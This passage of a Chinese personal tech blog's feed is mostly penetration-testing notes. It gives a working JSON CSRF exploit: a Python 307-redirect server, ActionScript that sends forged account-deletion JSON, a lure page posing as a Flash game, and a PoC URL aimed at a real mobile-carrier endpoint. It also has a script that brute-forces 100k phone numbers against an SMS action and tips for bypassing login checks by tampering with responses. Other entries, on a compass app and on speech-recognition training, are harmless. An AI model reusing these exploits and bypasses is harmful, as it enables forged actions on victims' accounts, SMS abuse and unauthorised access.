<h2 id="绕过json项目："><a href="#绕过json项目：" class="headerlink" title="绕过json项目："></a>绕过json项目：</h2><p><a href="https://github.com/appsecco/json-flash-csrf-poc">json-flash-csrf-poc</a></p>
<p>*注意：需要用户浏览器启用 Flash</p>
<p>​    	*<strong>浏览器实现可能不同</strong>  所以 <strong>307 重定向默认会变成 GET 请求</strong>（即使原请求是 POST）</p>
<p>需要安装mxmlc命令，flex-config.xml内的playerglobal指向的参数可能要更改，以及32.0&#x2F;43或者27.0&#x2F;38</p>
<h3 id="PoC工作流程"><a href="#PoC工作流程" class="headerlink" title="PoC工作流程"></a>PoC工作流程</h3><p>下面给出的是攻击的整个过程，其中目标用户的浏览器必须启用Flash：</p>
<p>\1.   用户在浏览器中登录<a href="http://victim-site/">http://victim-site/</a>。</p>
<p>\2.   用户被重定向到<a href="http://attacker-ip:8000/csrf.swf">http://attacker-ip:8000/csrf.swf</a>。</p>
<p>\3.   Flash文件加载成功，并向<a href="http://attacker-ip:8000/">http://attacker-ip:8000/</a>发送带有自定义Header的POST Payload。</p>
<p>\4.   攻击者的服务器发送HTTP 307重定向，这样便能让POST响应body和自定义HTTP头按原样发送到 <a href="http://victim-site/">http://victim-site/</a>。</p>
<p>\5.   目标用户刷新自己的 <a href="http://victim-site/">http://victim-site/</a> 页面，并发现自己的帐户已经被删除了。</p>
<h1 id="POC-1"><a href="#POC-1" class="headerlink" title="POC-1"></a>POC-1</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> http.server <span class="keyword">import</span> BaseHTTPRequestHandler, HTTPServer</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&#x27;&#x27;</span></span><br><span class="line">PORT = <span class="number">8000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RedirectHandler</span>(<span class="title class_ inherited__">BaseHTTPRequestHandler</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">do_POST</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span>.path == <span class="string">&#x27;/csrf.swf&#x27;</span>:</span><br><span class="line">            <span class="variable language_">self</span>.send_response(<span class="number">200</span>)</span><br><span class="line">            <span class="variable language_">self</span>.send_header(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;application/x-shockwave-flash&quot;</span>)</span><br><span class="line">            <span class="variable language_">self</span>.end_headers()</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;csrf.swf&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                <span class="variable language_">self</span>.wfile.write(f.read())</span><br><span class="line">            <span class="keyword">return</span> </span><br><span class="line">        <span class="variable language_">self</span>.send_response(<span class="number">307</span>)</span><br><span class="line">        <span class="variable language_">self</span>.send_header(<span class="string">&quot;Location&quot;</span>, <span class="string">&quot;http://192.168.43.66:5000/api/test&quot;</span>)</span><br><span class="line">        <span class="comment">##该url为希望执行操作的网址</span></span><br><span class="line">        </span><br><span class="line">        <span class="variable language_">self</span>.end_headers()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">do_GET</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="variable language_">self</span>.path)</span><br><span class="line">        <span class="variable language_">self</span>.do_POST()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    server_class = HTTPServer</span><br><span class="line">    httpd = server_class((HOST, PORT), RedirectHandler)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;%s Server Starts - %s:%s&#x27;</span> % (time.asctime(), HOST <span class="keyword">or</span> <span class="string">&#x27;0.0.0.0&#x27;</span>, PORT))</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        httpd.serve_forever()</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    httpd.server_close()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;%s Server Stops - %s:%s&#x27;</span> % (time.asctime(), HOST <span class="keyword">or</span> <span class="string">&#x27;0.0.0.0&#x27;</span>, PORT))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package</span><br><span class="line">&#123;</span><br><span class="line">  import flash.display.Sprite;</span><br><span class="line">  import flash.net.URLLoader;</span><br><span class="line">  import flash.net.URLRequest;</span><br><span class="line">  import flash.net.URLRequestHeader;</span><br><span class="line">  import flash.net.URLRequestMethod;</span><br><span class="line">public class csrf extends Sprite</span><br><span class="line">  &#123;</span><br><span class="line">    public function csrf()</span><br><span class="line">    &#123;</span><br><span class="line">      super();</span><br><span class="line">      var member1:Object = null;</span><br><span class="line">      var myJson:String = null;</span><br><span class="line">      member1 = new Object();</span><br><span class="line">      member1 = &#123;</span><br><span class="line">          &quot;acctnum&quot;:&quot;100&quot;,</span><br><span class="line">          &quot;confirm&quot;:&quot;true&quot;</span><br><span class="line">      &#125;;</span><br><span class="line">      var myData:Object = member1;</span><br><span class="line">      myJson = JSON.stringify(myData);</span><br><span class="line">      var url:String = &quot;http://127.0.0.1:8000&quot;;</span><br><span class="line">      ##该ip为攻击者服务器</span><br><span class="line">      var request:URLRequest = new URLRequest(url);</span><br><span class="line">      request.requestHeaders.push(new URLRequestHeader(&quot;Content-Type&quot;,&quot;application/json&quot;));</span><br><span class="line">      request.data = myJson;</span><br><span class="line">      request.method = URLRequestMethod.POST;</span><br><span class="line">      var urlLoader:URLLoader = new URLLoader();</span><br><span class="line">try</span><br><span class="line">      &#123;</span><br><span class="line">          urlLoader.load(request);</span><br><span class="line">          return;</span><br><span class="line">      &#125;</span><br><span class="line">      catch(e:Error)</span><br><span class="line">      &#123;</span><br><span class="line">          trace(e);</span><br><span class="line">          return;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">###下方代码为伪装的网页，不用也可以，只要输入攻击者ip也会被定向，效果一样的</span><br><span class="line">（会被过滤成get型）</span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Flash Game - Play Now!<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 伪装成正常网页，诱使用户访问 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">body</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-family</span>: Arial, sans-serif;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">text-align</span>: center;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">50px</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.flash-container</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin</span>: <span class="number">20px</span> auto;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: <span class="number">550px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">height</span>: <span class="number">400px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#ccc</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background</span>: <span class="number">#f9f9f9</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>🎮 Exciting Flash Game! 🎮<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>Click below to play the game (requires Flash Player):<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- 嵌入恶意 Flash --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;flash-container&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">object</span> <span class="attr">width</span>=<span class="string">&quot;550&quot;</span> <span class="attr">height</span>=<span class="string">&quot;400&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">&quot;movie&quot;</span> <span class="attr">value</span>=<span class="string">&quot;http://attacker-ip:8000/csrf.swf&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">embed</span> <span class="attr">src</span>=<span class="string">&quot;http://attacker-ip:8000/csrf.swf&quot;</span> <span class="attr">width</span>=<span class="string">&quot;550&quot;</span> <span class="attr">height</span>=<span class="string">&quot;400&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">embed</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">small</span>&gt;</span>Note: If you see a blank screen, make sure Flash Player is enabled.<span class="tag">&lt;/<span class="name">small</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- 额外伪装成正常内容 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;margin-top: 30px;&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span>This game requires Adobe Flash Player. <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>Download here<span class="tag">&lt;/<span class="name">a</span>&gt;</span>.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="POC-2"><a href="#POC-2" class="headerlink" title="POC-2"></a>POC-2</h1><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">https://www.0xdawn.cn/swf_json_csrf/test.swf?endpoint=https://sim.ecloud.10086.cn:8085/simauth/app/updateAppInfo&amp;reqmethod=POST&amp;ct=application/json;charset=UTF-8&amp;jsonData=&#123;%22appId%22:%22300016001555%22,%22appName%22:%220xdawn%22&#125;&amp;php_url=https://www.0xdawn.cn/swf_json_csrf/test.php</span><br></pre></td></tr></table></figure>



<h1 id="csrf漏洞详解网址："><a href="#csrf漏洞详解网址：" class="headerlink" title="csrf漏洞详解网址："></a>csrf漏洞详解网址：</h1><p><a href="https://xz.aliyun.com/news/7506">一次渗透测试引发的Json格式下CSRF攻击的探索-先知社区</a></p>
<p>..&#x2F;_code&#x2F;csrf</p>
]]></content>
      <categories>
        <category>Cybersecurity</category>
      </categories>
      <tags>
        <tag>web-net</tag>
      </tags>
  </entry>
  <entry>
    <title>指南针-导航</title>
    <url>/2025/04/01/%E5%AF%BC%E8%88%AA/</url>
    <content><![CDATA[<h1 id="项目"><a href="#项目" class="headerlink" title="项目"></a>项目</h1><p>主要：<a href="https://github.com/Kr0oked/Compass">指南针项目</a></p>
<p>后端：<a href="">步行规划</a></p>
<h1 id="记录"><a href="#记录" class="headerlink" title="记录"></a>记录</h1><p>获取磁场传感器、加速度传感器，得到方向角。打开app的一瞬间以手机方向为arrow_image.png的指向角度</p>
<p>偏转角度：</p>
<p>定位指向真北的角度+正北顺时针到目标经纬度的角度</p>
<p>以定位更改为刷新	&#x2F;&#x2F;	以每2s为更新次数</p>
<p>难点：</p>
<p>对Android Studio完全陌生，即便更改别人的指南针项目也一定时间无法搞懂其项目结构，对java的不熟悉更是难以下脚</p>
<p>语音的接入以及服务器发包和接包这几个功能点的嵌入无从动手</p>
<p>做法：</p>
<p>先更改其ui来熟悉项目结构</p>
<p>新增功能点，只要接入角度的偏转就行</p>
<span id="more"></span>

<h2 id="内容更改"><a href="#内容更改" class="headerlink" title="内容更改"></a>内容更改</h2><p>\Compass-master\Compass-master\app\src\main\java\com\bobek\compass\CompassFragment.kt<br>—&gt;updateCompass</p>
<p>\Downloads\Compass-master\Compass-master\app\src\main\res\layout\compass_view.xml<br>@+id&#x2F;cardinal_direction_north_text—–北</p>
<p>\Compass-master\Compass-master\app\src\main\res\values-zh\strings.xml</p>
<p>更改参考文字</p>
<p>###########需要更改<br>\Compass-master\Compass-master\app\src\main\java\com\bobek\compass\view\CompassView.kt<br>R.string.degrees—动态更改距离</p>
<p>\Compass-master\Compass-master\app\src\main\java\com\bobek\compass\model\Azimuth.kt<br>val degrees—偏转角度</p>
<h6 id="方向角的计算公式："><a href="#方向角的计算公式：" class="headerlink" title="方向角的计算公式："></a>方向角的计算公式：</h6><p><img src="/../image/map-app/azimuth.png" alt="azimuth"></p>
]]></content>
      <categories>
        <category>Android Studio</category>
      </categories>
      <tags>
        <tag>Android Studio</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>前端游走</title>
    <url>/2025/03/04/%E5%89%8D%E7%AB%AF%E6%B8%B8%E8%B5%B0/</url>
    <content><![CDATA[<h1 id="前端加密对抗"><a href="#前端加密对抗" class="headerlink" title="前端加密对抗"></a>前端加密对抗</h1><p>网址教学：<a href="https://xz.aliyun.com/news/14066">https://xz.aliyun.com/news/14066</a></p>
<p>我主要使用的方法是其中的 <a href="https://github.com/jxhczhl/JsRpc">JsRpc</a>  +  python</p>
<h3 id="1-找明码函数"><a href="#1-找明码函数" class="headerlink" title="[1]找明码函数"></a>[1]找明码函数</h3><p>找到其中明码所代表的变量，一般查找方式为查找关键字：<strong>encrypt</strong> ，来找到明码加密的函数</p>
<p>通常银行之类的会采用<code>response.use</code>或者<code>request.use</code>进行发包或者监听响应，所以可以直接在开发者模式进行搜索然后打断点进行一步一步的调试</p>
<h3 id="2-连rpc-设断点"><a href="#2-连rpc-设断点" class="headerlink" title="[2]连rpc-设断点"></a>[2]连rpc-设断点</h3><p>连接jsrpc，设置断点，设置全局变量，设置demo变量，设置demo变量的功能</p>
<span id="more"></span>

<p>连接–&gt;<a href="https://github.com/cliayn/cliayn.github.io/blob/master/image/web-js-freely/1.txt">连接函数</a>，断点自己找明文就行</p>
<p><img src="/../image/web-js-freely/1.png" alt="该图取自先知社区"></p>
<p>全局变量如下，例如加密函数a(t)，t是明码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">window.enc=a</span><br><span class="line">//如果复杂则用下面的</span><br><span class="line"></span><br><span class="line">window.enc=function()&#123;xxxxx&#125;</span><br></pre></td></tr></table></figure>

<p>设置demo变量如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var demo = new Hlclient(&quot;ws://127.0.0.1:12080/ws?group=zzz&quot;);</span><br></pre></td></tr></table></figure>

<p>设置demo变量的功能：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">//</span><br><span class="line">demo.regAction(&quot;enc&quot;, function (resolve, param) &#123;</span><br><span class="line">    var res = enc(String(param));</span><br><span class="line">    resolve(res);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//这里是传多个参数</span><br><span class="line">demo.regAction(&quot;enc&quot;, function (resolve,param) &#123;</span><br><span class="line">    //这里还是param参数 param里面的key 是先这里写，但到时候传接口就必须对应的上</span><br><span class="line">    res=hlg(param[&quot;user&quot;],param[&quot;status&quot;])</span><br><span class="line">    resolve(res);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p><strong>！！！</strong>值得注意的是：</p>
<p>​	<strong>运行js到断点处执行所有的代码和指令，例如设置全局变量一定要在断点处，否则可能会找不到明码变量</strong></p>
<h3 id="3-跑py代码"><a href="#3-跑py代码" class="headerlink" title="[3]跑py代码"></a>[3]跑py代码</h3><p>py代码框架大概如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//例如我爆破手机号</span><br><span class="line">import json</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">file_path = &#x27;sampled_100k.txt&#x27;</span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">    with open(file_path, &#x27;r&#x27;) as file:</span><br><span class="line">        for line in file:</span><br><span class="line">            print(line.strip())  # .strip() to remove any extra newline characters</span><br><span class="line">            phone_number = line.strip()</span><br><span class="line">            </span><br><span class="line">            url = f&quot;http://127.0.0.1:12080/go?group=zzz&amp;action=sendSms&amp;param=&#123;phone_number&#125;&quot;</span><br><span class="line">            res = requests.get(url)</span><br><span class="line">            print(res.text)</span><br><span class="line">            </span><br><span class="line">except FileNotFoundError:</span><br><span class="line">    print(f&quot;File &#123;file_path&#125; not found.&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>！！！</strong>值得注意的是：</p>
<p>​	<strong>你定义的window.enc函数的功能决定res.text返回的是什么</strong></p>
<h1 id="前端穿梭"><a href="#前端穿梭" class="headerlink" title="前端穿梭"></a>前端穿梭</h1><p>如果你因为进入不了后台而找不全接口，或者渗透时js老是强制跳转登录页面，这个可能能帮到你</p>
<h3 id="1-绕过登录口"><a href="#1-绕过登录口" class="headerlink" title="[1]绕过登录口"></a>[1]绕过登录口</h3><p>提供几个方法以供参考，如果不行还是得审计js文件</p>
<h5 id="·1-更改响应包"><a href="#·1-更改响应包" class="headerlink" title="·1.更改响应包"></a>·1.更改响应包</h5><p>更改登录接口返回的响应包，将flase改成true，或者code改成200或者0，status改成200或者0，具体数字可能需要审计js代码，看他们js监控的登录成功的响应是什么，一般情况就是200或者0</p>
<h5 id="·2-控制台强制跳转"><a href="#·2-控制台强制跳转" class="headerlink" title="·2.控制台强制跳转"></a>·2.控制台强制跳转</h5><p>这个比较万金油，在控制台输入如下指令，如果用不了你就得看js文件—看下方注意事项</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//引号后面加要跳转的目录</span><br><span class="line">window.location.href = &quot;/mch/info_basic/&quot;;</span><br><span class="line"></span><br><span class="line">//不行可以用这个</span><br><span class="line"></span><br><span class="line">location.hash = &#x27;/user/admin&#x27;;</span><br></pre></td></tr></table></figure>

<p>如果你看到闪现了一下后台的页面就代表他们是把后台页面也放到了前端了的，有两种情况</p>
<p>1&gt;跳转后可能在控制台会报错，点击报错的js位置进行断点，然后再输入一次控制台指令，当然，你直接在url输入也一样，就可以卡到js加载的后端</p>
<p><img src="/../image/web-js-freely/test2.jpg"></p>
<p>2&gt;跳转后无异常，又有两种情况解决</p>
<p>​	—你需要多找几个断点，直到找到控制台输入指令可以调试的那个断点，一直调试下一步，直到有后台页面</p>
<p>​	—控制台输入代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">window.onbeforeunload = function() &#123;</span><br><span class="line">    return &quot;你确定要离开吗？&quot;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">//然后再输入</span><br><span class="line">location.hash = &#x27;/admin/xxxx&#x27;;</span><br></pre></td></tr></table></figure>

<p>​			一般来说，就会跳转到第一种情况，当然，具体情况还得看js咋写的</p>
<p><img src="/../image/web-js-freely/test1.jpg"></p>
<p>跳转到后台页面后一般是不能点击里面的链接的，这个时候要跳到f12的网络功能或者打开burp拦截包，将返回”Unauthorized”或者相关的都禁用或者拦截，禁用完之后，再运行一次控制台指令就不会强制跳转了</p>
<p><img src="/../image/web-js-freely/3.png"></p>
<p>！！！值得注意的是：</p>
<p>1&gt;<strong>记得提前删除网络日历，要不然太多了影响判断</strong></p>
<blockquote>
<blockquote>
<blockquote>
<blockquote>
<blockquote>
<p>2&gt;<strong>一般看js文件中用的是什么强制跳转的函数，js用什么你就用什么，例如这个就要用location.hash&#x3D;”(后台目录)”</strong></p>
</blockquote>
</blockquote>
</blockquote>
</blockquote>
</blockquote>
<p><img src="/../image/web-js-freely/2.jpg"></p>
<h1 id="本地更改js文件"><a href="#本地更改js文件" class="headerlink" title="本地更改js文件"></a>本地更改js文件</h1><p>1&gt;无需多言，看得懂，会改，哪基本前端就没有什么秘密了</p>
]]></content>
      <categories>
        <category>Cybersecurity</category>
      </categories>
      <tags>
        <tag>web-net</tag>
        <tag>js</tag>
        <tag>key</tag>
      </tags>
  </entry>
  <entry>
    <title>方言识别</title>
    <url>/2025/02/18/%E6%96%B9%E8%A8%80%E8%AF%86%E5%88%AB/</url>
    <content><![CDATA[<p><strong>前言：</strong></p>
<p>​	为了便宜行事，可以找语音识别的现成项目进行修改，我最多是一个拼接的应用层，技术算法那些就别花费太多时间了，我只要知道是什么，如何用就成，把高端的科技服务我这种普通人</p>
<p>(–训练200轮，1轮3-5小时，跑了3轮暂时搁置–)</p>
<p>参考项目：<a href="https://github.com/yeyupiaoling/PaddlePaddle-DeepSpeech/tree/release/1.0">https://github.com/yeyupiaoling/PaddlePaddle-DeepSpeech/tree/release/1.0</a></p>
<p>参考视频：<a href="https://www.bilibili.com/video/BV1Ng411j7xB/?spm_id_from=333.788.videopod.sections&vd_source=62ec56a0e96ac07702343ec20500f1cc">DeepSpeech2实现的中文语音识别_哔哩哔哩_bilibili</a></p>
<hr>
<p>可参考项目:<a href="https://blog.csdn.net/gitblog_00059/article/details/136961410">https://blog.csdn.net/gitblog_00059/article/details/136961410</a></p>
<hr>
<h4 id="以参考项目为例："><a href="#以参考项目为例：" class="headerlink" title="以参考项目为例："></a>以参考项目为例：</h4><h5 id="1-流程"><a href="#1-流程" class="headerlink" title="1&gt;流程"></a>1&gt;流程</h5><p>下载数据集—&gt;数据预处理—&gt;训练模型—&gt;预测模型—&gt;预测方言成文字—&gt;结果</p>
<h6 id="·出现的问题"><a href="#·出现的问题" class="headerlink" title="·出现的问题"></a>·出现的问题</h6><span id="more"></span>

<p>[1]–下载GUDAA以及啥来着忘了，一个拖动的</p>
<p>[2]–下载C++工具</p>
<h1 id="方言识别模型训练思路框架"><a href="#方言识别模型训练思路框架" class="headerlink" title="方言识别模型训练思路框架"></a>方言识别模型训练思路框架</h1><h2 id="1-数据准备"><a href="#1-数据准备" class="headerlink" title="1. 数据准备"></a>1. 数据准备</h2><h3 id="1-1-收集方言语音数据"><a href="#1-1-收集方言语音数据" class="headerlink" title="1.1 收集方言语音数据"></a>1.1 收集方言语音数据</h3><ul>
<li>收集多种方言的语音数据，如粤语、吴语、闽南语等。</li>
<li>数据应该包括：<ul>
<li><strong>音频文件</strong>：采用 WAV 格式的语音文件。</li>
<li><strong>转录文件</strong>：每个音频文件对应的文字转录（普通话或方言的标注文本）。</li>
</ul>
</li>
<li>数据量要足够多，保证训练的多样性。</li>
</ul>
<h3 id="1-2-数据标注"><a href="#1-2-数据标注" class="headerlink" title="1.2 数据标注"></a>1.2 数据标注</h3><ul>
<li>对方言语音进行准确的标注，确保转录文件和音频文件一一对应。</li>
<li>可以使用拼音、普通话字符集进行标注。</li>
<li>对不同方言的转录进行统一标准化处理。</li>
</ul>
<h2 id="2-数据预处理"><a href="#2-数据预处理" class="headerlink" title="2. 数据预处理"></a>2. 数据预处理</h2><h3 id="2-1-特征提取"><a href="#2-1-特征提取" class="headerlink" title="2.1 特征提取"></a>2.1 特征提取</h3><ul>
<li>将音频文件转换为 <strong>梅尔频率倒谱系数（MFCC）</strong> 特征。<ul>
<li>通过音频处理工具（如 <code>librosa</code>）提取 MFCC 特征。</li>
</ul>
</li>
<li>可选：使用数据增强技术，如添加背景噪声，进行时间偏移等。</li>
</ul>
<h3 id="2-2-文本规范化"><a href="#2-2-文本规范化" class="headerlink" title="2.2 文本规范化"></a>2.2 文本规范化</h3><ul>
<li>规范化文本数据，确保文本格式统一。<ul>
<li>可以进行拼音转换，或者采用标准的普通话字符集。</li>
</ul>
</li>
</ul>
<h3 id="2-3-数据集划分"><a href="#2-3-数据集划分" class="headerlink" title="2.3 数据集划分"></a>2.3 数据集划分</h3><ul>
<li>划分训练集、验证集和测试集（常见的比例是 80% 训练集，10% 验证集，10% 测试集）。</li>
</ul>
<h2 id="3-安装-DeepSpeech"><a href="#3-安装-DeepSpeech" class="headerlink" title="3. 安装 DeepSpeech"></a>3. 安装 DeepSpeech</h2><h3 id="3-1-安装依赖"><a href="#3-1-安装依赖" class="headerlink" title="3.1 安装依赖"></a>3.1 安装依赖</h3><ul>
<li><p>安装 DeepSpeech：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip install deepspeech</span><br></pre></td></tr></table></figure>
</li>
<li><p>安装训练时的依赖：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">复制编辑</span><br><span class="line">pip install deepspeech-gpu</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="3-2-环境配置"><a href="#3-2-环境配置" class="headerlink" title="3.2 环境配置"></a>3.2 环境配置</h3><ul>
<li>配置 Python 环境，安装所需的库（如 <code>tensorflow</code>, <code>numpy</code> 等）。</li>
</ul>
<h2 id="4-模型训练"><a href="#4-模型训练" class="headerlink" title="4. 模型训练"></a>4. 模型训练</h2><h3 id="4-1-准备数据文件"><a href="#4-1-准备数据文件" class="headerlink" title="4.1 准备数据文件"></a>4.1 准备数据文件</h3><ul>
<li><p>将数据集转化为 DeepSpeech 支持的格式（CSV 文件），包含音频路径和对应文本。</p>
</li>
<li><p>例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">csv</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">复制编辑</span><br><span class="line">path/to/audio1.wav,你好</span><br><span class="line">path/to/audio2.wav,早安</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="4-2-配置训练参数"><a href="#4-2-配置训练参数" class="headerlink" title="4.2 配置训练参数"></a>4.2 配置训练参数</h3><ul>
<li><p>设置训练参数：</p>
<ul>
<li><p>学习率、批量大小、训练步数等。</p>
</li>
<li><p>例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">复制编辑</span><br><span class="line">--train_batch_size 32</span><br><span class="line">--dev_batch_size 16</span><br><span class="line">--epochs 30</span><br><span class="line">--checkpoint_dir checkpoints</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h3 id="4-3-启动训练"><a href="#4-3-启动训练" class="headerlink" title="4.3 启动训练"></a>4.3 启动训练</h3><ul>
<li><p>使用 DeepSpeech 的命令行工具启动训练：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">复制编辑</span><br><span class="line">deepspeech --train_files data/train.csv --dev_files data/dev.csv --test_files data/test.csv --train_batch_size 32 --dev_batch_size 16 --epochs 30 --checkpoint_dir checkpoints</span><br></pre></td></tr></table></figure>
</li>
<li><p>训练过程中 DeepSpeech 会自动进行特征提取和模型训练。</p>
</li>
</ul>
<h2 id="5-模型评估与优化"><a href="#5-模型评估与优化" class="headerlink" title="5. 模型评估与优化"></a>5. 模型评估与优化</h2><h3 id="5-1-评估模型性能"><a href="#5-1-评估模型性能" class="headerlink" title="5.1 评估模型性能"></a>5.1 评估模型性能</h3><ul>
<li>在每个训练周期后评估模型在验证集和测试集上的表现。</li>
<li>使用 <strong>字符错误率（CER）</strong> 或 <strong>词错误率（WER）</strong> 来衡量模型性能。</li>
</ul>
<h3 id="5-2-优化策略"><a href="#5-2-优化策略" class="headerlink" title="5.2 优化策略"></a>5.2 优化策略</h3><ul>
<li>调整超参数（如学习率、批量大小等）来优化模型训练。</li>
<li>增加训练数据量，特别是方言区域的多样性。</li>
<li>使用噪声抑制和数据增强来提高鲁棒性。</li>
</ul>
<h2 id="6-方言识别应用"><a href="#6-方言识别应用" class="headerlink" title="6. 方言识别应用"></a>6. 方言识别应用</h2><h3 id="6-1-使用训练好的模型进行推理"><a href="#6-1-使用训练好的模型进行推理" class="headerlink" title="6.1 使用训练好的模型进行推理"></a>6.1 使用训练好的模型进行推理</h3><ul>
<li><p>使用训练好的模型进行语音识别：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">复制编辑</span><br><span class="line">deepspeech --model checkpoints/model.pbmm --scorer checkpoints/model.scorer --audio your_audio.wav</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="6-2-应用部署"><a href="#6-2-应用部署" class="headerlink" title="6.2 应用部署"></a>6.2 应用部署</h3><ul>
<li>将模型部署到实际的应用中，如语音助手、自动字幕生成、方言识别等。</li>
</ul>
<h2 id="7-持续优化"><a href="#7-持续优化" class="headerlink" title="7. 持续优化"></a>7. 持续优化</h2><ul>
